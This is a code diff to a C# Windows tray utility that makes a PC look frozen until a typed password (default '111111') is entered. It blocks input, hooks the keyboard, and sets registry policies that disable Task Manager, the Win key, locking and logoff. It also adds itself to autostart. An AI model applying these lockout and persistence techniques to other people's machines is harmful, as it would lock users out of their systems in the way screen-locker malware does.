@@ -16,7 +16,7 @@ namespace FakeFreezeApp
         [DllImport("user32.dll")]
         public static extern bool BlockInput(bool block);
 
-        // 安装/卸载全局钩子
+        // 安装/卸载全局键盘钩子
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -26,15 +26,15 @@ namespace FakeFreezeApp
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
-        // 获取当前模块句柄，用于设置钩子
+        // 获取当前模块句柄
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        // 设置线程执行状态，防止系统待机和关屏
+        // 设置线程执行状态，防止待机关屏
         [DllImport("kernel32.dll")]
         static extern uint SetThreadExecutionState(uint esFlags);
 
-        // 注册/取消注册会话更改消息
+        // 注册/取消注册会话更改消息(监听锁屏/解锁)
         [DllImport("wtsapi32.dll", SetLastError = true)]
         public static extern bool WTSRegisterSessionNotification(IntPtr hWnd, int dwFlags);
 
@@ -47,7 +47,7 @@ namespace FakeFreezeApp
         private const uint ES_DISPLAY_REQUIRED = 0x00000002;
         private const uint ES_SYSTEM_REQUIRED = 0x00000001;
 
-        // 键盘钩子回调委托
+        // 键盘钩子回调
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
         private static HookProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
@@ -55,26 +55,34 @@ namespace FakeFreezeApp
         // 解锁相关
         private static readonly StringBuilder inputBuffer = new StringBuilder();
         private static string unlockPassword = "111111";
-        private static bool isUnlocked = false;  // 标记当前是否已解锁
+        private static bool isUnlocked = false;
 
-        // 应用相关
+        // 应用标识 & 主窗口引用
         private const string appName = "FakeFreezeApp";
         private static MainForm instance;
 
-        // 定时器，用于持续维持阻塞（防止 Ctrl+Alt+Del+ESC 时解冻）
+        // 定时器，用于维持假死状态
         private static System.Threading.Timer keepBlockingTimer;
-
-        // 新增：是否在程序启动后立即锁定
-        private static bool autoLockOnStartup = false;
 
         #endregion
 
-        #region 构造函数与窗体事件
+        #region 构造函数 & 事件
+
         public MainForm()
         {
             InitializeComponent();
             instance = this;
+
+            // 初始化托盘图标、菜单
             InitializeTrayIcon();
+
+            // 1) 在构造函数里读取是否"开启即锁定"
+            bool autoLockOnStartup = LoadAutoLockOnStartupFromRegistry();
+            if (autoLockOnStartup)
+            {
+                // 2) 若为true，则立即启动假死
+                StartFakeFreeze();
+            }
         }
 
         private async void MainForm_Load(object sender, EventArgs e)
@@ -84,37 +92,30 @@ namespace FakeFreezeApp
             this.ShowInTaskbar = false;
             this.WindowState = FormWindowState.Minimized;
 
-            // 注册会话更改消息通知
+            // 注册会话更改消息
             WTSRegisterSessionNotification(this.Handle, NOTIFY_FOR_THIS_SESSION);
 
-            // 读取注册表中的解锁密码（如果存在）
+            // 读取解锁密码（如果存在）
             LoadPasswordFromRegistry();
 
-            // 读取是否启动后立即锁定的设置
-            LoadAutoLockOnStartupFromRegistry();
-
-            // 按需延迟或直接启动假死
-            await Task.Delay(1000);
-
-            // 如果用户勾选了自动锁定，就执行 StartFakeFreeze
-            if (autoLockOnStartup)
-            {
-                StartFakeFreeze();
-            }
+            // 可以根据需要稍作延迟
+            await Task.Delay(500);
         }
 
         private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
         {
-            // 退出时，停止假死并注销会话监听
+            // 退出时停止假死
             StopFakeFreeze();
+            // 注销会话更改事件
             WTSUnRegisterSessionNotification(this.Handle);
         }
+
         #endregion
 
-        #region 注册表存取 - 密码 & 启动锁定选项
+        #region 注册表操作：解锁密码 & AutoLockOnStartup
 
         /// <summary>
-        /// 从注册表读取解锁密码，如果不存在则使用默认"111111"
+        /// 读取解锁密码
         /// </summary>
         private void LoadPasswordFromRegistry()
         {
@@ -124,24 +125,19 @@ namespace FakeFreezeApp
                 {
                     if (key != null)
                     {
-                        var value = key.GetValue("UnlockPassword");
-                        if (value != null)
-                        {
-                            unlockPassword = value.ToString();
-                            return;
-                        }
+                        object value = key.GetValue("UnlockPassword");
+                        if (value != null) unlockPassword = value.ToString();
                     }
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show("读取注册表密码失败：" + ex.Message);
+                MessageBox.Show("读取密码失败：" + ex.Message);
             }
-            unlockPassword = "111111";
         }
 
         /// <summary>
-        /// 保存解锁密码到注册表
+        /// 保存解锁密码
         /// </summary>
         private void SavePasswordToRegistry(string password)
         {
@@ -154,14 +150,14 @@ namespace FakeFreezeApp
             }
             catch (Exception ex)
             {
-                MessageBox.Show("保存密码到注册表失败：" + ex.Message);
+                MessageBox.Show("保存密码失败：" + ex.Message);
             }
         }
 
         /// <summary>
-        /// 读取 是否“启动后立即锁定”的配置
+        /// 读取"是否开启即锁定"配置
         /// </summary>
-        private void LoadAutoLockOnStartupFromRegistry()
+        private bool LoadAutoLockOnStartupFromRegistry()
         {
             try
             {
@@ -169,27 +165,24 @@ namespace FakeFreezeApp
                 {
                     if (key != null)
                     {
-                        var value = key.GetValue("AutoLockOnStartup");
+                        object value = key.GetValue("AutoLockOnStartup");
                         if (value != null)
                         {
-                            // 如果该值存在并且是1，就标记为 true
-                            autoLockOnStartup = (value.ToString() == "1");
-                            return;
+                            return (value.ToString() == "1");
                         }
                     }
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show("读取是否自动锁定配置失败：" + ex.Message);
+                MessageBox.Show("读取自动锁定失败：" + ex.Message);
             }
-
-            // 默认关闭
-            autoLockOnStartup = false;
+            // 默认为 false
+            return false;
         }
 
         /// <summary>
-        /// 保存 是否“启动后立即锁定”的配置 到注册表
+        /// 保存"是否开启即锁定"配置
         /// </summary>
         private void SaveAutoLockOnStartupToRegistry(bool enable)
         {
@@ -202,63 +195,77 @@ namespace FakeFreezeApp
             }
             catch (Exception ex)
             {
-                MessageBox.Show("保存自动锁定配置到注册表失败：" + ex.Message);
+                MessageBox.Show("保存自动锁定失败：" + ex.Message);
             }
         }
 
         #endregion
 
-        #region 托盘图标与菜单事件
+        #region 托盘图标与菜单
         private void InitializeTrayIcon()
         {
             notifyIconApp.Icon = SystemIcons.Shield;
             notifyIconApp.Text = "蹲坑守护";
             notifyIconApp.Visible = true;
 
-            ContextMenuStrip contextMenuTray = new ContextMenuStrip();
+            ContextMenuStrip menu = new ContextMenuStrip();
 
-            // 1. 开始守护
-            ToolStripMenuItem menuItemStart = new ToolStripMenuItem("开始守护");
+            // "开始守护"：手动启动假死
+            var menuItemStart = new ToolStripMenuItem("开始守护");
             menuItemStart.Click += menuItemStart_Click;
+            menu.Items.Add(menuItemStart);
 
-            // 2. 配置密码
-            ToolStripMenuItem menuItemConfig = new ToolStripMenuItem("配置密码");
+            // "配置密码"
+            var menuItemConfig = new ToolStripMenuItem("配置密码");
             menuItemConfig.Click += menuItemConfig_Click;
+            menu.Items.Add(menuItemConfig);
 
-            // 3. 启动后立即锁定 - 新增
-            ToolStripMenuItem menuItemAutoLock = new ToolStripMenuItem("启动后立即锁定");
-            menuItemAutoLock.Checked = autoLockOnStartup;  // 读取当前状态
-            menuItemAutoLock.Click += menuItemAutoLock_Click;
+            // "开启即锁定"
+            var menuItemAutoLock = new ToolStripMenuItem("开启即锁定");
+            bool autoLock = LoadAutoLockOnStartupFromRegistry();
+            menuItemAutoLock.Checked = autoLock;
+            menuItemAutoLock.Click += (s, e) =>
+            {
+                bool newVal = !menuItemAutoLock.Checked;
+                menuItemAutoLock.Checked = newVal;
+                SaveAutoLockOnStartupToRegistry(newVal);
 
-            // 4. 开机启动
-            ToolStripMenuItem menuItemStartup = new ToolStripMenuItem("开机启动");
+                MessageBox.Show(newVal ?
+                    "下次启动将自动锁定" :
+                    "下次启动不再自动锁定");
+            };
+            menu.Items.Add(menuItemAutoLock);
+
+            // "开机启动"
+            var menuItemStartup = new ToolStripMenuItem("开机启动");
             menuItemStartup.Click += menuItemStartup_Click;
+            menu.Items.Add(menuItemStartup);
 
-            // 5. 退出
-            ToolStripMenuItem menuItemExit = new ToolStripMenuItem("退出");
+            // "退出"
+            var menuItemExit = new ToolStripMenuItem("退出");
             menuItemExit.Click += menuItemExit_Click;
+            menu.Items.Add(menuItemExit);
 
-            contextMenuTray.Items.Add(menuItemStart);
-            contextMenuTray.Items.Add(menuItemConfig);
-            contextMenuTray.Items.Add(menuItemAutoLock);
-            contextMenuTray.Items.Add(menuItemStartup);
-            contextMenuTray.Items.Add(menuItemExit);
+            notifyIconApp.ContextMenuStrip = menu;
 
-            notifyIconApp.ContextMenuStrip = contextMenuTray;
-
+            // 检查并显示"开机启动"是否已勾选
             CheckStartupStatus(menuItemStartup);
         }
 
+        // 点击"开始守护"
         private void menuItemStart_Click(object sender, EventArgs e)
         {
             StartFakeFreeze();
             ShowAutoCloseMessageBox("守护模式已启动！", "提示", 500);
         }
 
+        // 点击"配置密码"
         private void menuItemConfig_Click(object sender, EventArgs e)
         {
             string newPassword = Microsoft.VisualBasic.Interaction.InputBox(
-                "请输入新的解锁密码：", "配置密码", unlockPassword);
+                "请输入新的解锁密码：",
+                "配置密码",
+                unlockPassword);
 
             if (!string.IsNullOrEmpty(newPassword))
             {
@@ -268,35 +275,17 @@ namespace FakeFreezeApp
             }
         }
 
-        // 新增：启动后立即锁定 选项
-        private void menuItemAutoLock_Click(object sender, EventArgs e)
-        {
-            if (sender is ToolStripMenuItem menuItem)
-            {
-                // 切换当前勾选状态
-                bool newState = !menuItem.Checked;
-                menuItem.Checked = newState;
-
-                // 保存到注册表
-                SaveAutoLockOnStartupToRegistry(newState);
-
-                autoLockOnStartup = newState;
-
-                string msg = newState ? "程序启动后将自动锁定" : "程序启动后不再自动锁定";
-                ShowAutoCloseMessageBox(msg, "提示", 800);
-            }
-        }
-
+        // 点击"开机启动"
         private void menuItemStartup_Click(object sender, EventArgs e)
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                var key = Registry.CurrentUser.OpenSubKey(
                     @"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
                 if (key == null)
                 {
-                    MessageBox.Show("无法打开注册表项，请检查权限。");
+                    MessageBox.Show("无法打开注册表，请检查权限。");
                     return;
                 }
 
@@ -313,19 +302,21 @@ namespace FakeFreezeApp
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"修改开机启动失败: {ex.Message}");
+                MessageBox.Show("开机启动设置失败: " + ex.Message);
             }
         }
 
+        // 点击"退出"
         private void menuItemExit_Click(object sender, EventArgs e)
         {
             StopFakeFreeze();
             Application.Exit();
         }
 
+        // 根据注册表判断"开机启动"是否勾选
         private void CheckStartupStatus(ToolStripMenuItem startupMenuItem)
         {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(
+            var key = Registry.CurrentUser.OpenSubKey(
                 @"Software\Microsoft\Windows\CurrentVersion\Run", false);
 
             if (key != null && key.GetValue(appName) != null)
@@ -337,9 +328,10 @@ namespace FakeFreezeApp
                 startupMenuItem.Checked = false;
             }
         }
+
         #endregion
 
-        #region 假死控制与定时器
+        #region 假死控制(开始/停止)与定时器
 
         private static void StartFakeFreeze()
         {
@@ -349,16 +341,21 @@ namespace FakeFreezeApp
             }
             isUnlocked = false;
 
+            // 阻塞输入
             BlockInput(true);
 
+            // 防止系统待机
             SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
 
+            // 安装键盘钩子
             HookKeyboard();
 
+            // 禁用任务管理器、Ctrl+Alt+Del、Win键
             DisableTaskManager();
             DisableCtrlAltDel();
             DisableWinKey();
 
+            // 启动定时器，持续维持假死
             StartKeepBlockingTimer();
         }
 
@@ -402,6 +399,7 @@ namespace FakeFreezeApp
             {
                 BlockInput(true);
 
+                // 如果钩子丢失就重新安装
                 if (_hookID == IntPtr.Zero)
                 {
                     HookKeyboard();
@@ -409,12 +407,15 @@ namespace FakeFreezeApp
             }
             else
             {
+                // 解锁后停止定时
                 StopKeepBlockingTimer();
             }
         }
+
         #endregion
 
         #region 键盘钩子
+
         private static void HookKeyboard()
         {
             _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(null), 0);
@@ -437,24 +438,19 @@ namespace FakeFreezeApp
                     inputBuffer.Append(pressedChar);
                     Console.WriteLine($"当前输入: {inputBuffer}");
 
-                    // 检测是否已解锁
-                    if (!isUnlocked
-                        && inputBuffer.ToString().ToLower().Contains(unlockPassword.ToLower()))
+                    // 检测解锁密码
+                    if (!isUnlocked &&
+                        inputBuffer.ToString().ToLower().Contains(unlockPassword.ToLower()))
                     {
-                        // 1) 标记已解锁
                         isUnlocked = true;
-
-                        // 2) 停止假死
                         StopFakeFreeze();
-
-                        // 3) 清空输入缓冲
                         inputBuffer.Clear();
 
-                        // 4) **关键：拦截此按键消息，不再传递给下一个钩子 / 系统**
+                        // 拦截此按键，避免最后字符"漏"到前台
                         return (IntPtr)1;
                     }
 
-                    // 为防止缓冲区无限增长，定期清空
+                    // 防止无限增长
                     if (inputBuffer.Length > unlockPassword.Length)
                     {
                         inputBuffer.Clear();
@@ -462,18 +458,18 @@ namespace FakeFreezeApp
                 }
             }
 
-            // 如果没有匹配解锁，则按原先逻辑传递消息
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
         #endregion
 
-        #region 禁用/启用任务管理器、Win键、Ctrl+Alt+Del
+        #region 禁用/启用 任务管理器、Ctrl+Alt+Del、Win键
 
         private static void DisableTaskManager()
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                var key = Registry.CurrentUser.OpenSubKey(
                     @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
 
                 if (key == null)
@@ -495,7 +491,7 @@ namespace FakeFreezeApp
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                var key = Registry.CurrentUser.OpenSubKey(
                     @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
 
                 if (key != null)
@@ -514,7 +510,7 @@ namespace FakeFreezeApp
         {
             try
             {
-                RegistryKey key = Registry.LocalMachine.OpenSubKey(
+                var key = Registry.LocalMachine.OpenSubKey(
                     @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
 
                 if (key == null)
@@ -527,6 +523,7 @@ namespace FakeFreezeApp
                 key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                 key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                 key.SetValue("DisableLogoff", 1, RegistryValueKind.DWord);
+
                 key.Close();
             }
             catch (Exception ex)
@@ -539,7 +536,7 @@ namespace FakeFreezeApp
         {
             try
             {
-                RegistryKey key = Registry.LocalMachine.OpenSubKey(
+                var key = Registry.LocalMachine.OpenSubKey(
                     @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
 
                 if (key != null)
@@ -561,7 +558,7 @@ namespace FakeFreezeApp
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.CreateSubKey(
+                var key = Registry.CurrentUser.CreateSubKey(
                     @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
 
                 key.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
@@ -577,7 +574,7 @@ namespace FakeFreezeApp
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.CreateSubKey(
+                var key = Registry.CurrentUser.CreateSubKey(
                     @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 key.DeleteValue("NoWinKeys", false);
                 key.Close();
@@ -587,25 +584,26 @@ namespace FakeFreezeApp
                 MessageBox.Show($"启用 Win 键失败: {ex.Message}");
             }
         }
+
         #endregion
 
-        #region 自动关闭提示框
+        #region 自动关闭消息框
+
         private void ShowAutoCloseMessageBox(string message, string title, int duration)
         {
             Task.Run(() =>
             {
-                DialogResult result = DialogResult.None;
                 this.Invoke(new Action(() =>
                 {
                     var thread = new Thread(() =>
                     {
-                        result = MessageBox.Show(message, title, MessageBoxButtons.OK);
+                        MessageBox.Show(message, title, MessageBoxButtons.OK);
                     });
 
                     thread.SetApartmentState(ApartmentState.STA);
                     thread.Start();
 
-                    Task.Delay(duration).ContinueWith((t) =>
+                    Task.Delay(duration).ContinueWith(t =>
                     {
                         if (thread.IsAlive)
                         {
@@ -615,14 +613,15 @@ namespace FakeFreezeApp
                 }));
             });
         }
+
         #endregion
 
-        #region 会话切换消息处理
+        #region 会话切换（锁屏/解锁）
         protected override void WndProc(ref Message m)
         {
             const int WM_WTSSESSION_CHANGE = 0x02B1;
-            const int WTS_SESSION_UNLOCK = 0x8;
-            const int WTS_SESSION_LOCK = 0x7;
+            const int WTS_SESSION_LOCK = 0x7; // 用户锁屏
+            const int WTS_SESSION_UNLOCK = 0x8; // 用户解锁
 
             base.WndProc(ref m);
 
@@ -632,12 +631,12 @@ namespace FakeFreezeApp
 
                 if (eventId == WTS_SESSION_LOCK)
                 {
-                    // 用户锁屏时，停止假死，防止锁屏界面卡死
+                    // 用户锁屏时停止假死
                     StopFakeFreeze();
                 }
                 else if (eventId == WTS_SESSION_UNLOCK)
                 {
-                    // 解锁后，再次启动假死
+                    // 解锁后，如未解锁，则再次启动假死
                     if (!isUnlocked)
                     {
                         StartFakeFreeze();
